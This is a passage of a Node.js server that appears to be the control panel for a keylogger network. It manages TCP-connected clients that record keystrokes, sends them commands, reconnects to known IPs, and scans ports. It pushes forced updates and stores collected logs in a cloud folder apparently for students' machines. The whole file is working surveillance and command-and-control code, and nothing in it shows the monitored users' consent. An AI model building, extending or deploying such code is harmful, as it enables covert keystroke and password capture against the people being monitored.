const express = require('express');
const http = require('http');
const https = require('https');
const WebSocket = require('ws');
const net = require('net');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const axios = require('axios');
const mysql = require('mysql2/promise');
const jschardet = require('jschardet');
const iconv = require('iconv-lite');
const pLimit = require('p-limit');
const winston = require('winston');
const DailyRotateFile = require('winston-daily-rotate-file');
const open = require('open');
const crypto = require('crypto');
const { LRUCache } = require('lru-cache');

// ========== 版本缓存 ==========
const versionCache = new LRUCache({
    max: 10000, // 只缓存一个条目
    ttl: 1 * 60 * 1000, // 5分钟TTL
});

// ========== 黑名单缓存管理 ==========
const BLACKLIST_UPDATE_INTERVAL = 5 * 60 * 1000; // 5分钟更新一次
const blacklistCache = new Map(); // 密码黑名单缓存
let blacklistLastUpdate = 0; // 黑名单上次更新时间

async function loadBlacklistCache() {
    const now = Date.now();
    if (now - blacklistLastUpdate < BLACKLIST_UPDATE_INTERVAL && blacklistCache.size > 0) {
        return; // 缓存未过期
    }
    
    try {
        const blacklistedRows = await executeWithRetry('SELECT password_hash, password FROM password_blacklist', []);
        blacklistCache.clear();
        blacklistedRows.forEach(row => {
            const normalizedPwd = normalizePassword(row.password);
            blacklistCache.set(row.password_hash, normalizedPwd);
        });
        blacklistLastUpdate = now;
        logger.debug(`黑名单缓存已更新，共 ${blacklistedRows.length} 个条目`);
    } catch (error) {
        logger.warn('加载黑名单缓存失败', { error: error.message });
    }
}

function isPasswordBlacklisted(password) {
    const normalizedPwd = normalizePassword(password);
    if (!normalizedPwd) return false;
    
    // 检查完全匹配
    const pwdHash = hashPassword(normalizedPwd);
    if (blacklistCache.has(pwdHash)) {
        logger.debug(`密码完全匹配黑名单: ${normalizedPwd}`);
        return true;
    }
    
    // 检查包含匹配：如果黑名单密码是当前密码的子串（长度>=3的密码）
    for (const blacklistedPwd of blacklistCache.values()) {
        if (blacklistedPwd && blacklistedPwd.length >= 3 && normalizedPwd.includes(blacklistedPwd)) {
            logger.debug(`密码包含黑名单项: ${normalizedPwd} 包含 ${blacklistedPwd}`);
            return true;
        }
    }
    
    return false;
}

// ========== 工具函数：生成自签名证书 ==========
function generateSelfSignedCert() {
    const { execSync, spawnSync } = require('child_process');
    const certsDir = './certs';
    
    if (!fs.existsSync(certsDir)) {
        fs.mkdirSync(certsDir, { recursive: true });
    }
    
    const keyPath = path.join(certsDir, 'server.key');
    const certPath = path.join(certsDir, 'server.crt');
    
    if (!fs.existsSync(keyPath) || !fs.existsSync(certPath)) {
        const check = spawnSync('openssl', ['version'], { stdio: 'ignore' });
        if (check.error || check.status !== 0) {
            logger.warn('当前系统未检测到 OpenSSL，无法自动生成自签名证书，请手动提供证书文件');
            return;
        }

        try {
            logger.info('生成自签名 SSL 证书...');
            execSync(`openssl req -x509 -newkey rsa:4096 -keyout "${keyPath}" -out "${certPath}" -days 365 -nodes -subj "/C=CN/ST=State/L=City/O=Organization/CN=localhost"`, { stdio: 'inherit' });
            logger.info('SSL 证书生成完成');
        } catch (error) {
            logger.error('生成 SSL 证书失败，请手动安装 OpenSSL 或提供证书文件', { error: error.message });
        }
    }
}

// ========== 环境变量加载与校验 ==========
require('dotenv').config({ path: '.env' });

const AUTH_CONFIG = {
    password: process.env.WEB_PASSWORD,
    secret: process.env.WEB_AUTH_SECRET,
    cookieName: 'keylogger_auth',
    maxAge: 24 * 60 * 60 * 1000
};

if (!AUTH_CONFIG.password) throw new Error('WEB_PASSWORD 环境变量必须设置');
if (!AUTH_CONFIG.secret) throw new Error('WEB_AUTH_SECRET 环境变量必须设置');

// ========== 辅助函数：Cookie 解析 ==========
function parseCookies(cookieHeader = '') {
    return cookieHeader.split(';').reduce((cookies, cookie) => {
        const [name, ...rest] = cookie.split('=');
        if (!name) return cookies;
        cookies[name.trim()] = rest.join('=').trim();
        return cookies;
    }, {});
}

function createAuthToken() {
    const expires = Date.now() + AUTH_CONFIG.maxAge;
    const payload = `${expires}`;
    const signature = crypto.createHmac('sha256', AUTH_CONFIG.secret).update(payload).digest('hex');
    return `${payload}.${signature}`;
}

function verifyAuthToken(token) {
    if (!token) return false;
    const [expires, signature] = token.split('.');
    if (!expires || !signature) return false;
    const expected = crypto.createHmac('sha256', AUTH_CONFIG.secret).update(expires).digest('hex');
    try {
        if (!crypto.timingSafeEqual(Buffer.from(signature, 'utf8'), Buffer.from(expected, 'utf8'))) {
            return false;
        }
    } catch (e) {
        return false;
    }
    return Date.now() <= Number(expires);
}

// ========== 配置常量 ==========
const CONFIG = {
    alist: {
        url: process.env.ALIST_URL,
        basePath: process.env.ALIST_BASE_PATH || '/学生目录/log',
        versionPath: process.env.ALIST_VERSION_PATH || '/学生目录/versions',
        username: process.env.ALIST_USERNAME,
        password: process.env.ALIST_PASSWORD,
        tokenRefreshMargin: 5 * 60 * 1000,
    },
    db: {
        host: process.env.DB_HOST || 'localhost',
        port: parseInt(process.env.DB_PORT) || 3306,
        user: process.env.DB_USER,
        password: process.env.DB_PASSWORD,
        database: process.env.DB_NAME,
        charset: 'utf8mb4',
        queueLimit: 0,
        enableKeepAlive: true,
        keepAliveInitialDelay: 10000,
        maxRetries: 3,
        retryDelay: 1000,
    },
    tcpPort: parseInt(process.env.TCP_PORT) || 9998,
    httpPort: parseInt(process.env.PORT) || 3233,
    heartbeatInterval: 30000,
    reconnectTimeout: 3000,
    maxConcurrentReconnects: 10,
    scanPorts: [9998],
    scanTimeout: 3000,
    uploadSizeLimit: '10mb',
    logDir: './logs',
    scanConcurrency: parseInt(process.env.SCAN_CONCURRENCY) || 200,
    extractConcurrency: parseInt(process.env.EXTRACT_CONCURRENCY) || 10,
    deleteConcurrency: parseInt(process.env.DELETE_CONCURRENCY) || 10,
    commandConcurrency: parseInt(process.env.COMMAND_CONCURRENCY) || 10,
    heartbeatConcurrency: parseInt(process.env.HEARTBEAT_CONCURRENCY) || 20,
};

// ========== 环境变量二次校验 ==========
const requiredEnvVars = [
    'WEB_PASSWORD', 'WEB_AUTH_SECRET',
    'ALIST_URL', 'ALIST_USERNAME', 'ALIST_PASSWORD',
    'DB_USER', 'DB_PASSWORD', 'DB_NAME'
];
const missingVars = requiredEnvVars.filter(varName => !process.env[varName]);
if (missingVars.length > 0) {
    console.error('缺少必需的环境变量，请在 .env 文件中设置以下变量：');
    missingVars.forEach(varName => console.error(`- ${varName}`));
    console.error('\n或者创建 .env 文件并配置这些变量。');
    process.exit(1);
}

// ========== 日志系统初始化 ==========
if (!fs.existsSync(CONFIG.logDir)) fs.mkdirSync(CONFIG.logDir, { recursive: true });

const logger = winston.createLogger({
    level: process.env.LOG_LEVEL || 'info',
    format: winston.format.combine(
        winston.format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),
        winston.format.errors({ stack: true }),
        winston.format.splat(),
        winston.format.json()
    ),
    defaultMeta: { service: 'log-manager' },
    transports: [
        new DailyRotateFile({
            filename: path.join(CONFIG.logDir, 'error-%DATE%.log'),
            datePattern: 'YYYY-MM-DD',
            level: 'error',
            maxSize: '20m',
            maxFiles: '14d'
        }),
        new DailyRotateFile({
            filename: path.join(CONFIG.logDir, 'combined-%DATE%.log'),
            datePattern: 'YYYY-MM-DD',
            maxSize: '20m',
            maxFiles: '14d'
        }),
        new DailyRotateFile({
            filename: path.join(CONFIG.logDir, 'audit-%DATE%.log'),
            datePattern: 'YYYY-MM-DD',
            level: 'info',
            maxSize: '20m',
            maxFiles: '30d',
            format: winston.format.combine(
                winston.format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),
                winston.format.printf(({ timestamp, level, message, user, action, ...meta }) => {
                    return `${timestamp} [AUDIT] ${user || 'unknown'} - ${action || 'unknown'}: ${message} ${Object.keys(meta).length ? JSON.stringify(meta) : ''}`;
                })
            )
        }),
        new winston.transports.Console({
            format: winston.format.combine(
                winston.format.colorize(),
                winston.format.printf(({ timestamp, level, message, ...meta }) => {
                    return `${timestamp} [${level}]: ${message} ${Object.keys(meta).length ? JSON.stringify(meta) : ''}`;
                })
            )
        })
    ],
});

const auditLogger = logger.child({ type: 'audit' });

// ========== Express 应用初始化 ==========
const app = express();
const server = http.createServer(app);
let wss;

app.use(cors());
app.use(express.json());

const asyncHandler = fn => (req, res, next) => {
    Promise.resolve(fn(req, res, next)).catch(next);
};

// ========== 认证中间件 ==========
function authMiddleware(req, res, next) {
    // 允许静态资源和登录页
    if (req.path.startsWith('/css') || req.path.startsWith('/js') || req.path.startsWith('/assets')) {
        return next();
    }
    
    // 允许客户端检查更新的路径（精确或前缀匹配）
    if (req.path === '/api/update/check' || req.path.startsWith('/api/update/check/')) {
        return next();
    }
    
    // 允许版本管理相关的路径
    if (req.path === '/api/update/get_version' || req.path === '/api/update/set_version' || req.path === '/api/update/check') {
        return next();
    }
    
    // 允许登录相关的路径
    const allowedPaths = ['/login', '/login.html', '/api/login'];
    if (allowedPaths.includes(req.path)) {
        return next();
    }
    
    const cookies = parseCookies(req.headers.cookie || '');
    if (verifyAuthToken(cookies[AUTH_CONFIG.cookieName])) {
        return next();
    }
    
    if (req.path.startsWith('/api/')) {
        return res.status(401).json({ error: '未授权' });
    }
    return res.redirect('/login');
}

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/api/login', asyncHandler(async (req, res) => {
    const { password } = req.body;
    const clientIP = req.ip || req.connection.remoteAddress || 'unknown';
    
    if (password === AUTH_CONFIG.password) {
        const token = createAuthToken();
        const secure = process.env.HTTPS_ENABLED === 'true';
        res.cookie(AUTH_CONFIG.cookieName, token, {
            path: '/',
            httpOnly: true,
            sameSite: 'Strict',
            secure
        });
        auditLogger.info('用户登录成功', { user: 'admin', action: 'login', ip: clientIP });
        return res.json({ success: true });
    }
    
    auditLogger.warn('用户登录失败：密码错误', { user: 'unknown', action: 'login_failed', ip: clientIP });
    return res.status(401).json({ success: false, error: '密码错误' });
}));

app.get('/logout', (req, res) => {
    const secure = process.env.HTTPS_ENABLED === 'true';
    res.clearCookie(AUTH_CONFIG.cookieName, {
        path: '/',
        httpOnly: true,
        sameSite: 'Strict',
        secure
    });
    res.redirect('/login');
});

app.use(authMiddleware);

function userMiddleware(req, res, next) {
    const cookies = parseCookies(req.headers.cookie || '');
    const token = cookies[AUTH_CONFIG.cookieName];
    req.user = (token && verifyAuthToken(token)) ? 'admin' : 'anonymous';
    next();
}

app.use(userMiddleware);
app.use(express.static(path.join(__dirname, 'public')));

// ========== Alist 客户端 ==========
class AlistClient {
    constructor(config) {
        this.baseUrl = config.url.replace(/\/$/, '');
        this.basePath = config.basePath.replace(/\/$/, '');
        this.username = config.username;
        this.password = config.password;
        this.token = null;
        this.tokenExpire = 0;
        this.tokenRefreshMargin = config.tokenRefreshMargin || 5 * 60 * 1000;
        this.logger = logger.child({ module: 'AlistClient' });

        const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 50, keepAliveMsecs: 60000 });
        const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 50, keepAliveMsecs: 60000 });

        this.axiosInstance = axios.create({
            httpAgent,
            httpsAgent,
            timeout: 30000,
            maxContentLength: 50 * 1024 * 1024,
            maxBodyLength: 50 * 1024 * 1024,
        });
        this.cache = new LRUCache({
            max: 300,
            ttl: 5 * 60 * 1000,
            updateAgeOnGet: true
        });
        this.loginPromise = null;
    }

    async _request(method, endpoint, data = null, options = {}, retry = true) {
        await this._ensureToken();
        const url = `${this.baseUrl}${endpoint}`;
        this.logger.info(`发送 ${method} 请求到 ${url}`);
        if (data) {
            this.logger.info(`请求数据: ${JSON.stringify(data)}`);
        }
        const headers = {
            'Authorization': this.token,
            ...options.headers
        };
        try {
            const response = await this.axiosInstance({
                method,
                url,
                data,
                headers,
                ...options
            });
            this.logger.info(`请求成功，响应状态码: ${response.status}`);
            this.logger.info(`响应数据: ${JSON.stringify(response.data)}`);
            return response.data;
        } catch (error) {
            if (error.response) {
                this.logger.error(`请求失败，响应状态码: ${error.response.status}`);
                this.logger.error(`响应数据: ${JSON.stringify(error.response.data)}`);
            } else if (error.request) {
                this.logger.error(`请求失败，没有收到响应`);
            } else {
                this.logger.error(`请求失败，错误: ${error.message}`);
            }
            if (retry && error.response && error.response.status === 401) {
                this.logger.warn('Token 失效，重新登录');
                await this._login();
                headers.Authorization = this.token;
                this.logger.info(`重新发送 ${method} 请求到 ${url}`);
                const retryResponse = await this.axiosInstance({ method, url, data, headers, ...options });
                this.logger.info(`重试请求成功，响应状态码: ${retryResponse.status}`);
                return retryResponse.data;
            }
            this.logger.error(`Alist 请求失败: ${method} ${endpoint}`, { error: error.message });
            throw error;
        }
    }

    async _login() {
        try {
            const response = await this.axiosInstance.post(`${this.baseUrl}/api/auth/login`, {
                username: this.username,
                password: this.password
            });
            if (response.data.code === 200) {
                this.token = response.data.data.token;
                this.tokenExpire = Date.now() + 23 * 60 * 60 * 1000 - this.tokenRefreshMargin;
                this.logger.info('Alist 登录成功');
            } else {
                throw new Error('Alist 登录失败: ' + response.data.message);
            }
        } catch (error) {
            this.logger.error('Alist 登录异常', { error: error.message });
            throw error;
        }
    }

    async _ensureToken() {
        if (!this.token || Date.now() >= this.tokenExpire) {
            if (!this.loginPromise) {
                this.loginPromise = this._login().finally(() => {
                    this.loginPromise = null;
                });
            }
            await this.loginPromise;
        }
    }

    _getCacheKey(prefix, key) {
        return `${prefix}:${key}`;
    }

    _invalidateCache(key) {
        this.cache.delete(key);
    }

    _getFullPath(relativePath) {
        return relativePath.startsWith('/') ? relativePath : `/${relativePath}`;
    }

    async ensureDir(dirPath) {
        const fullPath = this._getFullPath(dirPath);
        try {
            await this._request('GET', `/api/fs/list?path=${encodeURIComponent(fullPath)}`);
        } catch (err) {
            if (err.response && err.response.status === 404) {
                await this._request('POST', '/api/fs/mkdir', { path: fullPath });
                this.logger.info(`创建目录: ${fullPath}`);
            } else {
                throw err;
            }
        }
    }

    async listFiles(dirPath) {
        const fullPath = this._getFullPath(dirPath);
        const cacheKey = this._getCacheKey('list', fullPath);
        this.logger.info(`开始列出目录 ${fullPath} 的文件`);

        const cached = this.cache.get(cacheKey);
        if (cached) {
            this.logger.info(`从缓存获取目录 ${fullPath} 的文件列表，共 ${cached.length} 个文件`);
            return cached;
        }

        try {
            this.logger.info(`发送请求列出目录 ${fullPath} 的文件`);
            const result = await this._request('GET', `/api/fs/list?path=${encodeURIComponent(fullPath)}`);
            this.logger.info(`请求成功，响应代码: ${result.code}`);
            if (result.code === 200) {
                let items = [];
                if (result.data?.content && Array.isArray(result.data.content)) {
                    items = result.data.content;
                    this.logger.info(`从 result.data.content 获取到 ${items.length} 个文件`);
                } else if (result.data?.files && Array.isArray(result.data.files)) {
                    items = result.data.files;
                    this.logger.info(`从 result.data.files 获取到 ${items.length} 个文件`);
                } else if (Array.isArray(result.data)) {
                    items = result.data;
                    this.logger.info(`从 result.data 获取到 ${items.length} 个文件`);
                } else {
                    this.logger.info(`无法从响应中提取文件列表，响应数据: ${JSON.stringify(result.data)}`);
                }
                const transformed = items.map(item => ({
                    filename: item.name || item.filename || 'unknown',
                    size: item.size || 0,
                    uploadTime: new Date(item.modified || item.updated || item.mtime || Date.now())
                }));
                this.cache.set(cacheKey, transformed);
                this.logger.info(`目录 ${fullPath} 的文件列表获取完成，共 ${transformed.length} 个文件`);
                return transformed;
            }
            this.logger.info(`响应代码不是 200，返回空列表`);
            return [];
        } catch (err) {
            this.logger.error(`列出目录 ${fullPath} 的文件失败`, { error: err.message });
            if (err.response && err.response.status === 404) {
                this.logger.info(`目录 ${fullPath} 不存在，返回空列表`);
                return [];
            }
            throw err;
        }
    }

    async readFile(filePath) {
        const fullPath = this._getFullPath(filePath);
        const result = await this._request('GET', `/api/fs/get?path=${encodeURIComponent(fullPath)}`);

        if (result.code === 200 && result.data) {
            let buffer;
            if (result.data.raw_url) {
                const response = await this.axiosInstance.get(result.data.raw_url, {
                    responseType: 'arraybuffer',
                    headers: { 'Authorization': this.token }
                });
                buffer = Buffer.from(response.data);
            } else if (result.data.content) {
                buffer = Buffer.from(result.data.content, 'base64');
            } else {
                throw new Error('无法获取文件内容');
            }

            const detected = jschardet.detect(buffer);
            const encoding = detected.encoding || 'utf-8';
            this.logger.debug(`文件编码检测: ${filePath} -> ${encoding} (置信度: ${detected.confidence})`);
            return iconv.decode(buffer, encoding);
        }
        throw new Error('文件内容获取失败或文件不存在');
    }

    async downloadFile(filePath, res) {
        const fullPath = this._getFullPath(filePath);
        await this._ensureToken();
        
        const infoResponse = await this.axiosInstance({
            method: 'GET',
            url: `${this.baseUrl}/api/fs/get?path=${encodeURIComponent(fullPath)}`,
            headers: { 'Authorization': this.token }
        });

        if (infoResponse.data.code !== 200 || !infoResponse.data.data || !infoResponse.data.data.raw_url) {
            throw new Error('获取文件下载链接失败');
        }

        const rawUrl = infoResponse.data.data.raw_url;
        const response = await this.axiosInstance({
            method: 'GET',
            url: rawUrl,
            headers: { 'Authorization': this.token },
            responseType: 'stream'
        });

        if (response.headers['content-type']) {
            res.setHeader('Content-Type', response.headers['content-type']);
        }
        
        const filename = path.basename(filePath);
        res.setHeader('Content-Disposition', `attachment; filename="${encodeURIComponent(filename)}"`);

        response.data.on('error', (err) => {
            res.destroy(err);
        });
        response.data.pipe(res);
    }

    async uploadFile(dirPath, filename, content) {
        const fullDir = this._getFullPath(dirPath);
        const fullPath = `${fullDir}/${filename}`;
        await this.ensureDir(dirPath);
        await this._request('PUT', `/api/fs/put?path=${encodeURIComponent(fullPath)}`, content, {
            headers: {
                'Content-Type': 'text/plain',
                'Content-Length': Buffer.byteLength(content)
            }
        });
        this._invalidateCache(this._getCacheKey('list', fullDir));
        this.logger.info(`文件上传成功: ${fullPath}`);
        return { success: true, filename };
    }

    async deleteFile(filePath) {
        const fullPath = this._getFullPath(filePath);
        const lastSlash = fullPath.lastIndexOf('/');
        const dir = lastSlash > 0 ? fullPath.substring(0, lastSlash) : '/';
        const filename = fullPath.substring(lastSlash + 1);

        await this._request('POST', '/api/fs/remove', {
            path: dir,
            names: [filename]
        });

        this._invalidateCache(this._getCacheKey('list', dir));
        this.logger.info(`文件已删除: ${fullPath}`);
        return { success: true };
    }
}

const alistClient = new AlistClient(CONFIG.alist);

// ========== MySQL 数据库 ==========
const dbPoolConfig = {
    host: CONFIG.db.host,
    port: CONFIG.db.port,
    user: CONFIG.db.user,
    password: CONFIG.db.password,
    database: CONFIG.db.database,
    charset: CONFIG.db.charset,
    connectionLimit: Math.min(parseInt(process.env.DB_POOL_SIZE) || 20, 50),
    queueLimit: CONFIG.db.queueLimit,
    enableKeepAlive: CONFIG.db.enableKeepAlive,
    keepAliveInitialDelay: CONFIG.db.keepAliveInitialDelay,
    waitForConnections: true,
    connectTimeout: 10000,
    idleTimeout: 60000,
};

const pool = mysql.createPool(dbPoolConfig);

pool.on('acquire', (connection) => {
    logger.debug(`数据库连接 ${connection.threadId} 被获取`);
});
pool.on('release', (connection) => {
    logger.debug(`数据库连接 ${connection.threadId} 被释放`);
});
pool.on('enqueue', () => {
    logger.debug('等待可用数据库连接');
});

// 修复：确保 connection 有效才释放
async function executeWithRetry(sql, params, retries = CONFIG.db.maxRetries) {
    let lastError;
    for (let i = 0; i < retries; i++) {
        let connection;
        try {
            connection = await pool.getConnection();
            const [result] = await connection.execute(sql, params);
            return result;
        } catch (error) {
            lastError = error;
            logger.warn(`数据库查询失败 (尝试 ${i + 1}/${retries}): ${error.message}`);
            if (error.code === 'PROTOCOL_CONNECTION_LOST' || error.code === 'ECONNREFUSED' || error.fatal) {
                const baseDelay = CONFIG.db.retryDelay;
                const exponentialDelay = baseDelay * Math.pow(2, i);
                const jitter = Math.random() * 100;
                const delay = exponentialDelay + jitter;
                logger.debug(`数据库重试将在 ${delay}ms 后进行`);
                await new Promise(resolve => setTimeout(resolve, delay));
                continue;
            }
            throw error;
        } finally {
            if (connection) connection.release();
        }
    }
    throw lastError;
}

function normalizePassword(password) {
    if (!password) return '';
    let normalized = String(password).trim();
    // 移除所有空格和换行符
    normalized = normalized.replace(/\s+/g, '');
    // 移除常见的特殊字符，但保留字母数字和基本符号
    normalized = normalized.replace(/[^\w!@#$%^&*()_+\-=\[\]{}|;':",./<>?`~]/g, '');
    return normalized;
}

function hashPassword(password) {
    return crypto.createHash('sha256').update(normalizePassword(password)).digest('hex');
}

async function initDatabase() {
    try {
        await executeWithRetry(`
            CREATE TABLE IF NOT EXISTS known_clients (
                id VARCHAR(45) PRIMARY KEY COMMENT '客户端标识 ip:port',
                ip VARCHAR(45) NOT NULL,
                port INT NOT NULL,
                last_seen BIGINT COMMENT '最后在线时间戳（毫秒）',
                created_at BIGINT COMMENT '创建时间戳（毫秒）'
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
        `);

        await executeWithRetry(`
            CREATE TABLE IF NOT EXISTS password_blacklist (
                id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
                password_hash CHAR(64) NOT NULL UNIQUE,
                password TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
        `);

        await executeWithRetry(`
            CREATE TABLE IF NOT EXISTS client_versions (
                id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
                version VARCHAR(20) NOT NULL UNIQUE COMMENT '版本号，如 1.0.1',
                download_url TEXT NOT NULL COMMENT '下载链接',
                is_active BOOLEAN DEFAULT FALSE COMMENT '是否为当前激活版本',
                force_update BOOLEAN DEFAULT FALSE COMMENT '是否强制更新',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
        `);

        logger.info('MySQL 数据库表初始化完成');
    } catch (error) {
        logger.error('数据库初始化失败，程序终止', { error: error.message });
        throw new Error(`数据库初始化失败: ${error.message}`);
    }
}

async function loadKnownClientsFromDB() {
    try {
        const rows = await executeWithRetry('SELECT id, ip, port, last_seen FROM known_clients');
        const clientsMap = new Map();
        rows.forEach(row => {
            clientsMap.set(row.id, {
                ip: row.ip,
                port: row.port,
                lastSeen: row.last_seen ? new Date(row.last_seen) : null
            });
        });
        logger.info(`从数据库加载了 ${clientsMap.size} 个已知客户端`);
        return clientsMap;
    } catch (error) {
        logger.warn('加载已知客户端失败，返回空列表', { error: error.message });
        return new Map();
    }
}

async function saveKnownClientToDB(clientId, ip, port) {
    try {
        const now = Date.now();
        await executeWithRetry(
            `INSERT INTO known_clients (id, ip, port, last_seen, created_at) 
             VALUES (?, ?, ?, ?, ?) 
             ON DUPLICATE KEY UPDATE 
                 ip = VALUES(ip), 
                 port = VALUES(port), 
                 last_seen = VALUES(last_seen)`,
            [clientId, ip, port, now, now]
        );
    } catch (error) {
        logger.warn('保存客户端到数据库失败', { error: error.message, clientId });
    }
}

async function updateLastSeen(clientId) {
    try {
        const now = Date.now();
        await executeWithRetry(
            'UPDATE known_clients SET last_seen = ? WHERE id = ?',
            [now, clientId]
        );
    } catch (error) {
        logger.warn('更新客户端最后在线时间失败', { error: error.message, clientId });
    }
}

async function deleteKnownClientFromDB(clientId) {
    try {
        await executeWithRetry('DELETE FROM known_clients WHERE id = ?', [clientId]);
        logger.info(`数据库记录已删除: ${clientId}`);
    } catch (error) {
        logger.warn('从数据库删除客户端失败', { error: error.message, clientId });
    }
}

// ========== ClientManager ==========
class ClientManager {
    constructor() {
        this.clients = new Map();
        this.knownClients = new Map();
        this.webClients = new Set();
        this.tcpServer = null;
        this.heartbeatTimer = null;
        this.reconnectLimit = pLimit(CONFIG.maxConcurrentReconnects);
        this.logger = logger.child({ module: 'ClientManager' });
    }

    async init() {
        try {
            await initDatabase();
            this.knownClients = await loadKnownClientsFromDB();
        } catch (error) {
            this.logger.warn('数据库初始化失败，继续启动服务器', { error: error.message });
            this.knownClients = new Map();
        }

        this.startTcpServer();
        this.startHeartbeat();
        await this.connectAllKnownClients();
    }

    startTcpServer() {
        this.tcpServer = net.createServer((socket) => {
            const remoteAddress = socket.remoteAddress.replace(/^::ffff:/, '');
            const remotePort = socket.remotePort;
            const clientId = `${remoteAddress}:${remotePort}`;

            this.logger.info(`客户端主动连接: ${clientId}`);

            const client = {
                id: clientId,
                ip: remoteAddress,
                port: remotePort,
                socket,
                status: 'online',
                recording: true,
                uploadEnabled: false,
                lastSeen: new Date(),
                logDir: alistClient.basePath,
                shouldReconnect: false
            };

            const existing = this.clients.get(clientId);
            if (existing) {
                existing.socket.destroy();
                this.clients.delete(clientId);
            }

            this.clients.set(clientId, client);
            this.knownClients.set(clientId, {
                ip: remoteAddress,
                port: remotePort,
                lastSeen: new Date()
            });
            saveKnownClientToDB(clientId, remoteAddress, remotePort).catch(e => this.logger.error(e));

            this.setupSocketListeners(client);
            this.broadcastClientUpdate(client, 'connected');
        });

        this.tcpServer.on('error', (err) => {
            this.logger.error('TCP 服务器错误', { error: err.message });
        });

        this.tcpServer.listen(CONFIG.tcpPort, () => {
            this.logger.info(`TCP 被动监听端口 ${CONFIG.tcpPort}`);
        });
    }

    setupSocketListeners(client) {
        const currentSocket = client.socket;

        currentSocket.on('data', (data) => {
            try {
                const messages = data.toString().split('\n').filter(m => m.trim());
                messages.forEach(msg => {
                    try {
                        const response = JSON.parse(msg);
                        this.handleResponse(client, response);
                    } catch (e) {
                        this.logger.error(`解析客户端消息失败: ${msg}`);
                    }
                });
            } catch (e) {
                this.logger.error('处理客户端数据失败', { error: e.message });
            }
        });

        currentSocket.on('close', () => {
            if (client.socket === currentSocket) {
                this.logger.info(`客户端 ${client.id} 连接断开`);
                this.markClientOffline(client);
            }
        });

        currentSocket.on('error', (err) => {
            if (client.socket === currentSocket) {
                this.logger.error(`客户端 ${client.id} 错误: ${err.message}`);
                this.markClientOffline(client);
                this.reconnectSingleClient(client.id).catch(e =>
                    this.logger.debug(`客户端 ${client.id} 立即重连失败: ${e.message}`)
                );
            }
        });
    }

    markClientOffline(client) {
        client.status = 'offline';
        const now = new Date();
        client.lastSeen = now;
        if (this.knownClients.has(client.id)) {
            this.knownClients.get(client.id).lastSeen = now;
        }
        updateLastSeen(client.id).catch(e => this.logger.error(e));
        this.broadcastClientUpdate(client, 'offline');
    }

    handleResponse(client, response) {
    client.lastSeen = new Date();
    updateLastSeen(client.id).catch(e => this.logger.error(e));
    this.logger.debug(`客户端 ${client.id} 响应数据: ${JSON.stringify(response)}`);

    if (response.status === 'ok' && response.data) {
        if (response.data.recording !== undefined) {
            client.recording = response.data.recording;
        }
        if (response.data.upload_enabled !== undefined) {
            client.uploadEnabled = response.data.upload_enabled;
        }
    }

    this.broadcastToWeb({
        type: 'client_response',
        clientId: client.id,
        response
    });
}

    sendCommand(clientId, command) {
        const client = this.clients.get(clientId);
        if (!client || client.status === 'offline') {
            return Promise.resolve({ success: false, error: '客户端离线或不存在' });
        }

        return new Promise((resolve) => {
            const commandStr = JSON.stringify(command) + '\n';
            client.socket.write(commandStr, (err) => {
                if (err) {
                    resolve({ success: false, error: err.message });
                } else {
                    resolve({ success: true });
                }
            });
        });
    }

    async broadcastCommand(command) {
        const tasks = [];
        for (const [clientId, client] of this.clients) {
            if (client.status === 'online') {
                tasks.push(
                    this.sendCommand(clientId, command).then(result => ({ clientId, ...result }))
                );
            }
        }
        return Promise.all(tasks);
    }

    startHeartbeat() {
        const limit = pLimit(CONFIG.heartbeatConcurrency);
        this.heartbeatTimer = setInterval(() => {
            const heartbeatTasks = [];
            this.clients.forEach((client, clientId) => {
                if (client.status === 'online') {
                    heartbeatTasks.push(limit(async () => {
                        try {
                            const result = await this.sendCommand(clientId, { action: 'ping' });
                            if (!result.success) {
                                this.logger.warn(`心跳失败: ${clientId}`);
                                this.markClientOffline(client);
                                this.reconnectSingleClient(clientId).catch(e => this.logger.error(e));
                            }
                        } catch (e) {
                            this.logger.warn(`心跳异常: ${clientId}`, { error: e.message });
                            this.markClientOffline(client);
                            this.reconnectSingleClient(clientId).catch(e => this.logger.error(e));
                        }
                    }));
                }
            });
            Promise.allSettled(heartbeatTasks).catch(err => this.logger.error('心跳批量任务异常', { error: err.message }));
        }, CONFIG.heartbeatInterval);
    }

    async connectAllKnownClients() {
        this.logger.info('开始逐个连接已知客户端...');
        const connectTasks = [];
        for (const [clientId, info] of this.knownClients.entries()) {
            const existingClient = this.clients.get(clientId);
            if (existingClient && existingClient.status === 'online') {
                continue;
            }
            connectTasks.push(this.reconnectLimit(() => this.reconnectSingleClient(clientId)));
        }
        await Promise.allSettled(connectTasks);
        this.logger.info('已知客户端连接尝试完成');
    }

    async reconnectSingleClient(clientId) {
        try {
            const info = this.knownClients.get(clientId);
            if (!info) {
                this.logger.warn(`尝试重连未知客户端: ${clientId}`);
                return;
            }
            this.logger.info(`尝试重连: ${clientId}`);
            const clientInfo = await this.tryConnect(info.ip, info.port);
            if (clientInfo) {
                this.logger.info(`重连成功: ${clientId}`);
            } else {
                this.logger.debug(`重连失败: ${clientId}`);
            }
        } catch (e) {
            this.logger.error(`重连异常: ${clientId}`, { error: e.message });
        }
    }

    async deleteKnownClient(clientId) {
        const client = this.clients.get(clientId);
        if (client) {
            client.socket.destroy();
            this.clients.delete(clientId);
        }
        this.knownClients.delete(clientId);
        await deleteKnownClientFromDB(clientId);
        this.broadcastToWeb({
            type: 'client_deleted',
            clientId: clientId
        });
        this.logger.info(`客户端 ${clientId} 已被完全删除`);
    }

    getClientInfo(client) {
        return {
            id: client.id,
            ip: client.ip,
            port: client.port,
            status: client.status,
            recording: client.recording,
            uploadEnabled: client.uploadEnabled,
            lastSeen: client.lastSeen
        };
    }

